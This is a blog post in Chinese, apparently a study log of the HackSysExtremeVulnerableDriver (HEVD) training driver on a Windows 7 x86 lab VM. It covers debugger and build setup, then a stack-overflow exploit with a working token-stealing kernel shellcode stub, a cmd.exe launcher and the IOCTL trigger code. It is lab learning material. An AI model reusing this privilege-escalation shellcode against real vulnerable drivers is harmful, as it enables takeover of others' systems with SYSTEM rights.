<!DOCTYPE html>
<html lang="zh-cn" color-mode="light">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="keywords" content="" />
  <meta name="author" content="郁涛丶" />
  <meta name="description" content="" />
  
  
  <title>
    
      HEVD-Windows7x86 SP1 记录 
      
      
      |
    
     郁涛丶&#39;s Blog
  </title>

  
    <link rel="apple-touch-icon" href="/images/favicon.png">
    <link rel="icon" href="/images/favicon.png">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  <link rel="stylesheet" href="/css/main.css" />
  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
  <!-- 代码块风格 -->
  
    
<link rel="stylesheet" href="/css/figcaption/mac-block.css">

  

  <!-- jquery3.3.1 -->
  
    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
  

  <!-- fancybox -->
  
    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
  
  
<script src="/js/fancybox.js"></script>


  

  

  <script>
    var html = document.documentElement
    const colorMode = localStorage.getItem('color-mode')
    if (colorMode) {
      document.documentElement.setAttribute('color-mode', colorMode)
    }
  </script>
<meta name="generator" content="Hexo 5.4.2"></head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a href="/">
      <!-- 头像取消懒加载，添加no-lazy -->
      
        <img src="/images/avatar.png" alt="">
      
    </a>
    <div class="nickname"><a href="/">Ghostasky</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">Home</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">Archives</a>
        </li>
      
        <li class="nav-item" data-path="/categories/">
          <a href="/categories/">Categories</a>
        </li>
      
        <li class="nav-item" data-path="/tags/">
          <a href="/tags/">Tags</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">About</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="/js/activeNav.js"></script>



      <div class="flex-container">
        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->


  <!-- LaTex Display -->

  
    <script async type="text/javascript" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script>
  
  <script>
    MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      }
    }
  </script>





  <!-- clipboard -->

  
    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
  
  
<script src="/js/codeCopy.js"></script>







  

  

  

  
  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
  <div class="container post-details" id="post-details">
    <div class="post-content">
      <div class="post-title">HEVD-Windows7x86 SP1 记录</div>
      <div class="post-attach">
        <span class="post-pubtime">
          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
          2023-08-12	  
        </span>
    <span class="post-pubtime"> 本文共17.7k字 </span>
    
    <span class="post-pubtime">大约需要131min </span>
        
              <span class="post-categories">
                <i class="iconfont icon-bookmark" title="Categories"></i>
                
                <span class="span--category">
                  <a href="/categories/Technology/" title="Technology">
                    <b>#</b> Technology
                  </a>
                </span>
                
              </span>
          
              <span class="post-tags">
                <i class="iconfont icon-tags mr-10" title="Tags"></i>
                
                <span class="span--tag mr-8">
                  <a href="/tags/WINDOWS/" title="WINDOWS">
                    #WINDOWS
                  </a>
                </span>
                
              </span>
          
      </div>
      <div class="markdown-body">
        <p>本文记录自己学习HEVD的全过程。</p>
<blockquote>
<p> 差不多全部完成了，还有一些小的问题需要完善，然后还有几篇文没有好好看，挑个时间好好看下</p>
<p>就这样吧，待完善的东西以后再说</p>
</blockquote>
<p>[toc]</p>
<h1 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h1><p>虚拟机：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">文件名</span><br><span class="line">cn_windows_7_professional_with_sp1_vl_build_x86_dvd_u_677939.iso</span><br><span class="line">SHA1</span><br><span class="line">27AE9FBAF9EE076F50F153353E42A3BE74A61FAB</span><br><span class="line">文件大小</span><br><span class="line">2.33GB</span><br><span class="line">发布时间</span><br><span class="line">2011-05-12</span><br><span class="line">ed2k://|file|cn_windows_7_professional_with_sp1_vl_build_x86_dvd_u_677939.iso|2502909952|935E5B4B754527BE3C238FA6ABDD9B86|/</span><br></pre></td></tr></table></figure>

<p>这个装vmtools有点费劲，用了个浏览器：centbrowser</p>
<p><a target="_blank" rel="noopener" href="https://www.catalog.update.microsoft.com/search.aspx?q=kb4474419">https://www.catalog.update.microsoft.com/search.aspx?q=kb4474419</a></p>
<p><img src="/2023/08/12/2023-8-HEVD/image-20230812111418904.png"></p>
<p>安装：VirtualKD-Redux-2022.2\target32<br><img src="/2023/08/12/2023-8-HEVD/image-20230812111613251.png"></p>
<p><img src="/2023/08/12/2023-8-HEVD/image-20230812111708539.png"></p>
<p>重启F8<br><img src="/2023/08/12/2023-8-HEVD/image-20230812111827122.png"></p>
<p>配置Win7测试模式：</p>
<ul>
<li>管理员运行cmd：<code>bcdedit -debug on</code></li>
<li>重启系统</li>
</ul>
<p>Win7 配置永久禁止验证驱动文件</p>
<p>gpedit.msc –&gt; 用户配置 –&gt; 管理模板 –&gt; 系统 –&gt; 驱动程序安装-&gt;<br>设备驱动程序的代码签名 –&gt; 选择<strong>已启用</strong> –&gt;选项选择<strong>忽略</strong>，重启</p>
<p><img src="/2023/08/12/2023-8-HEVD/image-20230812112351965.png"></p>
<p>dbgview<br>kmdmanager</p>
<p><img src="/2023/08/12/2023-8-HEVD/image-20230812113512169.png"></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; lm m h*</span><br><span class="line">Browse full module list</span><br><span class="line">start    end        module name</span><br><span class="line">84238000 8426e000   hal        (deferred)             </span><br><span class="line">88635000 8863d000   hwpolicy   (deferred)             </span><br><span class="line">9240c000 92491000   HTTP       (deferred)             </span><br><span class="line">9d2b3000 9d2d2000   HDAudBus   (deferred)             </span><br><span class="line">9d855000 9d8a5000   HdAudio    (deferred)             </span><br><span class="line">9d9b6000 9d9c1000   hidusb     (deferred)             </span><br><span class="line">9d9c1000 9d9d4000   HIDCLASS   (deferred)             </span><br><span class="line">9d9d4000 9d9da480   HIDPARSE   (deferred)             </span><br><span class="line">aa16b000 aa1b5000   HEVD       (private pdb symbols)  d:\winddk\symbols\HEVD.pdb\8921ACC09C6B46A38CA2F42DA3E21ADA1\HEVD.pdb</span><br></pre></td></tr></table></figure>


<p>将gdb文件放到符号表目录里，我的是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.sympath SRV*D:\WinDDK\symbols*http://msdl.microsoft.com/download/symbols;</span><br><span class="line">.reload</span><br></pre></td></tr></table></figure>

<p>测试符号表：<code>x HEVD!*</code></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; x HEVD!*</span><br><span class="line">aa16e014          HEVD!__security_cookie_complement = 0x2aaa9a21</span><br><span class="line">aa16e018          HEVD!g_ARWHelperObjectNonPagedPoolNx = struct _ARW_HELPER_OBJECT_NON_PAGED_POOL_NX *[65535]</span><br><span class="line">aa1ae014          HEVD!g_UseAfterFreeObjectNonPagedPool = 0x00000000</span><br><span class="line">aa16d04c          HEVD!__guard_check_icall_fptr = 0xaa16c404</span><br><span class="line">aa16d050          HEVD!GuardCheckLongJumpTargetImpl = 0x00000000</span><br><span class="line">aa16d140          HEVD!__safe_se_handler_table = void *[]</span><br><span class="line">aa16d098          HEVD!_load_config_used = struct _IMAGE_LOAD_CONFIG_DIRECTORY32</span><br><span class="line">aa16e010          HEVD!__security_cookie = 0xd55565de</span><br><span class="line">aa16e000          HEVD!__NLG_Destination = struct _NLG_INFO</span><br><span class="line">aa1ae018          HEVD!g_UseAfterFreeObjectNonPagedPoolNx = 0x00000000</span><br><span class="line">aa1b1410          HEVD!FreeUaFObjectNonPagedPoolIoctlHandler (struct _IRP *, struct _IO_STACK_LOCATION *)</span><br><span class="line">aa1b17f2          HEVD!UaFObjectCallbackNonPagedPoolNx (void)</span><br><span class="line">aa1b0920          HEVD!TriggerMemoryDisclosureNonPagedPoolNx (void *, unsigned long)</span><br><span class="line">aa1b03aa          HEVD!TriggerDoubleFetch (struct _DOUBLE_FETCH *)</span><br><span class="line">aa1b0ade          HEVD!TriggerNullPointerDereference (void *)</span><br><span class="line">aa1b173c          HEVD!FreeUaFObjectNonPagedPoolNx (void)</span><br><span class="line">aa16c045          HEVD!__SEH_epilog4 (void)</span><br><span class="line">aa16c3a5          HEVD!_NLG_Notify (void)</span><br><span class="line">aa16c000          HEVD!__SEH_prolog4 (void)</span><br><span class="line">aa1b0aaa          HEVD!NullPointerDereferenceIoctlHandler (struct _IRP *, struct _IO_STACK_LOCATION *)</span><br><span class="line">aa16c2d0          HEVD!_unwind_handler4 (void)</span><br><span class="line">aa1af5e4          HEVD!CreateArbitraryReadWriteHelperObjectNonPagedPoolNx (struct _ARW_HELPER_OBJECT_IO *)</span><br><span class="line">aa1b1806          HEVD!UseUaFObjectNonPagedPoolNx (void)</span><br><span class="line">aa1b14f0          HEVD!AllocateFakeObjectNonPagedPoolNx (struct _FAKE_OBJECT_NON_PAGED_POOL_NX *)</span><br><span class="line">aa1b14e8          HEVD!UseUaFObjectNonPagedPoolIoctlHandler (struct _IRP *, struct _IO_STACK_LOCATION *)</span><br><span class="line"></span><br></pre></td></tr></table></figure>










<p>编程环境这里wdk和sdk要一样，都安装的1809的那个</p>
<p>我又装了个vs2017，重新编译的，可能需要注意的几个地方：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MSB8038	已启用 Spectre 缓解，但找不到 Spectre 缓解库。验证 Visual Studio 工作负荷包括 Spectre 缓解库。有关详细信息，请参阅 https://aka.ms/Ofhn4c。	HackSysExtremeVulnerableDriver	C:\Program Files (x86)\Microsoft Visual Studio\2017\Community\Common7\IDE\VC\VCTargets\Microsoft.CppBuild.targets	402	</span><br></pre></td></tr></table></figure>

<p>禁用掉</p>
<p><img src="/2023/08/12/2023-8-HEVD/image-20230812075020399.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invalid certificate or password.	HackSysExtremeVulnerableDriver	D:\Windows Kits\10\build\WindowsDriver.common.targets	1373	</span><br></pre></td></tr></table></figure>

<p> HEVD.pfx删掉：<br><a target="_blank" rel="noopener" href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/issues/29">https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/issues/29</a></p>
<p><img src="/2023/08/12/2023-8-HEVD/image-20230812075232152.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;Inf2Cat, signability test failed.&quot; Double click to see the tool output.	HackSysExtremeVulnerableDriver	C:\Users\29927\Downloads\HackSysExtremeVulnerableDriver-master\Driver\HEVD\Windows\x64\DebugSecure\inf2catOutput.log	1	</span><br></pre></td></tr></table></figure>

<p>设置成本地事件即可</p>
<p><img src="/2023/08/12/2023-8-HEVD/image-20230812075339890.png"></p>
<p>之后注册打开就行：</p>
<p><img src="/2023/08/12/2023-8-HEVD/image-20230812075610578.png"></p>
<p>输入命令 <code>lm m h*</code></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt;  lm m h*</span><br><span class="line">Browse full module list</span><br><span class="line">start             end                 module name</span><br><span class="line">fffff805`09875000 fffff805`09912000   hal        (deferred)             </span><br><span class="line">fffff805`0e3e0000 fffff805`0e448000   HdAudio    (deferred)             </span><br><span class="line">fffff805`0e680000 fffff805`0e7cd000   HTTP       (deferred)             </span><br><span class="line">fffff805`0e8b0000 fffff805`0e8c3000   HIDPARSE   (deferred)             </span><br><span class="line">fffff805`0ecf0000 fffff805`0ed02000   hidusb     (deferred)             </span><br><span class="line">fffff805`0ed10000 fffff805`0ed4b000   HIDCLASS   (deferred)             </span><br><span class="line">fffff805`0ef30000 fffff805`0ef4f000   HDAudBus   (deferred)             </span><br><span class="line">fffff805`0f8b0000 fffff805`0f93e000   HEVD       (deferred) </span><br></pre></td></tr></table></figure>


<h1 id="2-StackOverflow-TriggerBufferOverflowStack"><a href="#2-StackOverflow-TriggerBufferOverflowStack" class="headerlink" title="2.StackOverflow-TriggerBufferOverflowStack"></a>2.StackOverflow-TriggerBufferOverflowStack</h1><p>HEVD源码示例 <code>HackSysExtremeVulnerableDriver-3.00\Driver\HEVD\BufferOverflowStack.c</code> 即为存在栈溢出的源码文件</p>
<p>没有检查UserBuffer的大小直接复制给了KernelBuffer</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __stdcall <span class="title function_">TriggerBufferOverflowStack</span><span class="params">(<span class="type">void</span> *UserBuffer, <span class="type">unsigned</span> <span class="type">int</span> Size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> KernelBuffer[<span class="number">512</span>]; <span class="comment">// [esp+10h] [ebp-81Ch] BYREF</span></span><br><span class="line">  CPPEH_RECORD ms_exc; <span class="comment">// [esp+814h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(KernelBuffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(KernelBuffer));</span><br><span class="line">  ms_exc.registration.TryLevel = <span class="number">0</span>;</span><br><span class="line">  ProbeForRead(UserBuffer, <span class="number">0x800</span>u, <span class="number">1u</span>);</span><br><span class="line">  _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserBuffer: 0x%p\n&quot;</span>, UserBuffer);</span><br><span class="line">  _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserBuffer Size: 0x%X\n&quot;</span>, Size);</span><br><span class="line">  _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] KernelBuffer: 0x%p\n&quot;</span>, KernelBuffer);</span><br><span class="line">  _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] KernelBuffer Size: 0x%X\n&quot;</span>, <span class="number">2048</span>);</span><br><span class="line">  _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Triggering Buffer Overflow in Stack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(KernelBuffer, UserBuffer, Size);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>执行流程：DriverEntry-&gt;IrpDeviceIoCtlHandler-&gt; BufferOverflowStackIoctlHandler-&gt;TriggerBufferOverflowStack</p>
<p><code>IoControlCode</code>为0x222003时进入<code>BufferOverflowStackIoctlHandler</code></p>
<p><img src="/2023/08/12/2023-8-HEVD/image-20230812220243415.png"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">PAGE:<span class="number">00444064</span> ; <span class="type">int</span> __stdcall <span class="title function_">IrpDeviceIoCtlHandler</span><span class="params">(_DEVICE_OBJECT *DeviceObject, _IRP *Irp)</span></span><br><span class="line">PAGE:00444064 _IrpDeviceIoCtlHandler@8 proc near      ; DATA XREF: DriverEntry(x,x)+<span class="number">87</span>↓o</span><br><span class="line">PAGE:<span class="number">00444064</span></span><br><span class="line">PAGE:<span class="number">00444064</span> DeviceObject    = dword ptr  <span class="number">8</span></span><br><span class="line">PAGE:<span class="number">00444064</span> Irp             = dword ptr  <span class="number">0</span>Ch</span><br><span class="line">PAGE:<span class="number">00444064</span></span><br><span class="line">PAGE:<span class="number">00444064</span>                 push    ebp</span><br><span class="line">PAGE:<span class="number">00444065</span>                 mov     ebp, esp</span><br><span class="line">PAGE:<span class="number">00444067</span>                 push    ebx<span class="comment">//这里push的后面要堆栈平衡</span></span><br><span class="line">PAGE:<span class="number">00444068</span>                 push    esi</span><br><span class="line">PAGE:<span class="number">00444069</span>                 push    edi</span><br><span class="line">PAGE:<span class="number">0044406</span>A                 mov     edi, [ebp+Irp]</span><br><span class="line">PAGE:<span class="number">0044406</span>D                 mov     ebx, <span class="number">0</span>C00000BBh</span><br><span class="line">PAGE:<span class="number">00444072</span>                 mov     eax, [edi+<span class="number">60</span>h]</span><br><span class="line">PAGE:<span class="number">00444075</span>                 test    eax, eax</span><br><span class="line">PAGE:<span class="number">00444077</span>                 jz      loc_4444C5</span><br><span class="line">PAGE:<span class="number">0044407</span>D                 mov     ebx, eax</span><br><span class="line">PAGE:<span class="number">0044407F</span>                 mov     ecx, [ebx+<span class="number">0</span>Ch]</span><br><span class="line">PAGE:<span class="number">00444082</span>                 lea     eax, [ecx<span class="number">-222003</span>h] ; <span class="keyword">switch</span> <span class="number">109</span> cases</span><br><span class="line">PAGE:<span class="number">00444088</span>                 cmp     eax, <span class="number">6</span>Ch</span><br><span class="line">PAGE:<span class="number">0044408B</span>                 ja      def_444098      ; jumptable <span class="number">00444098</span> <span class="keyword">default</span> <span class="keyword">case</span>, cases <span class="number">2236420</span><span class="number">-2236422</span>,<span class="number">2236424</span><span class="number">-2236426</span>,<span class="number">2236428</span><span class="number">-2236430</span>,<span class="number">2236432</span><span class="number">-2236434</span>,<span class="number">2236436</span><span class="number">-2236438</span>,<span class="number">2236440</span><span class="number">-2236442</span>,<span class="number">2236444</span><span class="number">-2236446</span>,<span class="number">2236448</span><span class="number">-2236450</span>,<span class="number">2236452</span><span class="number">-2236454</span>,<span class="number">2236456</span><span class="number">-2236458</span>,<span class="number">2236460</span><span class="number">-2236462</span>,<span class="number">2236464</span><span class="number">-2236466</span>,<span class="number">2236468</span><span class="number">-2236470</span>,<span class="number">2236472</span><span class="number">-2236474</span>,<span class="number">2236476</span><span class="number">-2236478</span>,<span class="number">2236480</span><span class="number">-2236482</span>,<span class="number">2236484</span><span class="number">-2236486</span>,<span class="number">2236488</span><span class="number">-2236490</span>,<span class="number">2236492</span><span class="number">-2236494</span>,<span class="number">2236496</span><span class="number">-2236498</span>,<span class="number">2236500</span><span class="number">-2236502</span>,<span class="number">2236504</span><span class="number">-2236506</span>,<span class="number">2236508</span><span class="number">-2236510</span>,<span class="number">2236512</span><span class="number">-2236514</span>,<span class="number">2236516</span><span class="number">-2236518</span>,<span class="number">2236520</span><span class="number">-2236522</span>,<span class="number">2236524</span><span class="number">-2236526</span></span><br><span class="line">PAGE:<span class="number">00444091</span>                 movzx   eax, byte ptr ds:Index_Table[eax]</span><br><span class="line">PAGE:<span class="number">00444098</span>                 jmp     ds:Func_Table[eax*<span class="number">4</span>] ; <span class="keyword">switch</span> jump</span><br><span class="line">...</span><br><span class="line">PAGE:<span class="number">004444</span>D6                 pop     edi</span><br><span class="line">PAGE:<span class="number">004444</span>D7                 pop     esi</span><br><span class="line">PAGE:<span class="number">004444</span>D8                 mov     eax, ebx</span><br><span class="line">PAGE:<span class="number">004444</span>DA                 pop     ebx</span><br><span class="line">PAGE:<span class="number">004444</span>DB                 pop     ebp</span><br><span class="line">PAGE:<span class="number">004444</span>DC                 retn    <span class="number">8</span></span><br></pre></td></tr></table></figure>


<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p><code>KernelBuffer</code>到ret是<code>0x81c + 0x4 = 0x820h</code></p>
<p><img src="/2023/08/12/2023-8-HEVD/image-20230812222729890.png" alt="image-20230812222729890"></p>
<p>首先生成shellcode空间：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(buffer, <span class="string">&#x27;A&#x27;</span>, <span class="number">0x824</span>);  </span><br><span class="line">*(PDWORD)(buffer + <span class="number">0x820</span>) = (DWORD)&amp;TokenStealingPayloadWin7;  </span><br></pre></td></tr></table></figure>

<p><code>_EPROCESS</code>结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">EPROCESS</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ...</span><br><span class="line">    VOID* UniqueProcessId;                                                  <span class="comment">//0xb4</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EX_FAST_REF</span> <span class="title">Token</span>;</span>                                              <span class="comment">//0xf8</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>获取systemtoken并覆盖自己的token：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">VOID TokenStealingPayloadWin7() &#123;</span><br><span class="line">	// Importance of Kernel Recovery</span><br><span class="line">	__asm &#123;</span><br><span class="line">		pushad; 保存各寄存器数据</span><br><span class="line">		; start of Token Stealing Stub</span><br><span class="line"></span><br><span class="line">		xor eax, eax; eax设置为0</span><br><span class="line">		mov eax, fs: [eax + 124h]; 获取 nt!_KPCR.PcrbData.CurrentThread</span><br><span class="line">		mov eax, [eax + 050h]; 获取 nt!_KTHREAD.ApcState.Process</span><br><span class="line">		mov ecx, eax; 将本进程EPROCESS地址复制到ecx</span><br><span class="line">		mov edx, 4; WIN 7 SP1 SYSTEM process PID = 0x4</span><br><span class="line"></span><br><span class="line">		SearchSystemPID:</span><br><span class="line">		mov eax, [eax + 0b8h]; 获取 nt!_EPROCESS.ActiveProcessLinks.Flink</span><br><span class="line">			sub eax, 0b8h</span><br><span class="line">			cmp[eax + 0b4h], edx; 获取 nt!_EPROCESS.UniqueProcessId</span><br><span class="line">			jne SearchSystemPID; 循环检测是否是SYSTEM进程PID</span><br><span class="line"></span><br><span class="line">			mov edx, [eax + 0f8h]; 获取System进程的Token</span><br><span class="line">			mov[ecx + 0f8h], edx; 将本进程Token替换为SYSTEM进程 nt!_EPROCESS.Token</span><br><span class="line">			; End of Token Stealing Stub</span><br><span class="line"></span><br><span class="line">			popad; 恢复各个寄存器数据</span><br><span class="line"></span><br><span class="line">			; Kernel Recovery Stub//恢复堆栈平衡防止蓝屏</span><br><span class="line">			xor eax, eax; 返回状态 SUCCEESS</span><br><span class="line">			add esp, 12; Fix the stack，复原前面IrpDeviceIoCtlHandler push的ebx esi edi</span><br><span class="line">			pop ebp; Restore saved EBP</span><br><span class="line">			ret 8; Return cleanly</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之后调用SYSTEM token执行cmd</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> VOID <span class="title function_">Cmd</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	STARTUPINFO si = &#123; <span class="keyword">sizeof</span>(si) &#125;;</span><br><span class="line">	PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	si.dwFlags = STARTF_USESHOWWINDOW;</span><br><span class="line">	si.wShowWindow = SW_SHOW;</span><br><span class="line">	WCHAR wzFilePath[MAX_PATH] = &#123; <span class="string">L&quot;cmd.exe&quot;</span> &#125;;</span><br><span class="line">	BOOL bReturn = CreateProcessW(<span class="literal">NULL</span>, wzFilePath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, CREATE_NEW_CONSOLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPSTARTUPINFOW)&amp;si, &amp;pi);</span><br><span class="line">	<span class="keyword">if</span> (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>与驱动交互：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">//调用驱动HackSysExtremeVulnerableDriver</span></span><br><span class="line">  hDevice = CreateFileA(<span class="string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span>,</span><br><span class="line">        GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">        FILE_SHARE_READ | FILE_SHARE_WRITE,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        OPEN_EXISTING,</span><br><span class="line">        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line"><span class="comment">//向HackSysExtremeVulnerableDriver传入控制码0x222003到达TriggerBufferOverflowStack，传入0x824大小的数据</span></span><br><span class="line">DeviceIoControl(hDevice, <span class="number">0x222003</span>, buffer, <span class="number">0x824</span>, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;bReturn, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>



<p><img src="/2023/08/12/2023-8-HEVD/image-20230812231728286.png" alt="image-20230812231728286"></p>
<h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><p>查看驱动服务开启后目标函数位于内存的位置：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; x HEVD!*</span><br><span class="line">...</span><br><span class="line">ad33561a          HEVDTriggerIntegerOverflow (void *, unsigned long)</span><br><span class="line">....</span><br></pre></td></tr></table></figure>

<p>跟踪<code>ad33561a</code>：</p>
